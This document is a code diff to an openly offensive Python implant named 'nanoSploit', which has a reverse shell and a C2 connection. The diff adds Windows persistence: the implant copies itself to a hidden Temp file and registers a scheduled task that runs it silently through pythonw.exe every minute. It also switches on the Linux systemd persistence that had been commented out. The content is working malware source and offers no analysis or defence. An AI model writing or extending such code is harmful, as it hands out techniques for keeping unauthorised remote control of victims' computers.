@@ -4,11 +4,13 @@ import subprocess
 import os
 import platform
 import struct
+import sys
 from base64 import b64encode
+from shutil import copyfile
 
 # Static globals
 SYSTEM = platform.system()
-LOCK_PATH = "/tmp/nanosploit.lock" if SYSTEM == "Linux" else "C:/temp/nanosploit.lock"
+LOCK_PATH = "/tmp/nanosploit.lock" if SYSTEM == "Linux" else f"C:/Users/{os.getlogin()}/AppData/Local/Temp/nanosploit.lock"
 SYSTEMD_UNIT = """[Unit]
 Description=nanoSploit
 After=network.target
@@ -139,7 +141,7 @@ def check_lock() -> bool:
     return False
 
 
-def systemd_service(home_path: str):
+def create_systemd_service(home_path: str):
     user_service_path = f"{home_path}/.config/systemd/user"
 
     # Creat systemd service directory
@@ -161,14 +163,36 @@ def persistence_linux():
     payload_path = f"{home_path}/.nanosploit"
 
     if not os.path.exists(payload_path):
+        # Using 'cp' because 'copyfile' remove the executable permission
         os.system(f"cp {__file__} {payload_path}")
 
     # Run persistence
-    systemd_service(home_path)
+    create_systemd_service(home_path)
+
+
+def create_scheduled_task(payload_path: str):
+    # Check if task already exists
+    output = subprocess.run("schtasks /query /fo csv /tn nanoSploit".split(" "), stdout=subprocess.DEVNULL)
+
+    if output.returncode != 0:
+        # If error then create task
+        try:
+            # Execute script with "pythonw.exe" so it doesn't pop a windows
+            os.system('schtasks /create /sc MINUTE /mo 1 /tn "nanoSploit" /tr '
+                      f'"{sys.executable.replace(".exe", "w.exe")} {payload_path}"')
+        except:
+            return False
+    return True
 
 
 def persistence_windows():
-    pass
+    payload_path = f"C:/Users/{os.getlogin()}/AppData/Local/Temp/nanosploit"
+
+    if not os.path.exists(payload_path):
+        copyfile(__file__, payload_path)
+        os.system(f"attrib +h {payload_path}")
+
+    create_scheduled_task(payload_path)
 
 
 ''' REVERSE SHELL '''
@@ -266,13 +290,13 @@ def main():
         return
     print("Lock is free !")
 
-    # Persistence (TODO: uncomment this before merge)
-    # print("Start persistence...")
-    # if platform.system() == "Linux":
-    #     persistence_linux()
-    # elif platform.system() == "Windows":
-    #     persistence_windows()
-    # print("Finished persistence !")
+    # Persistence
+    print("Start persistence...")
+    if platform.system() == "Linux":
+        persistence_linux()
+    elif platform.system() == "Windows":
+        persistence_windows()
+    print("Finished persistence !")
 
     # Start secure connection with C2
     ss = init_connection()
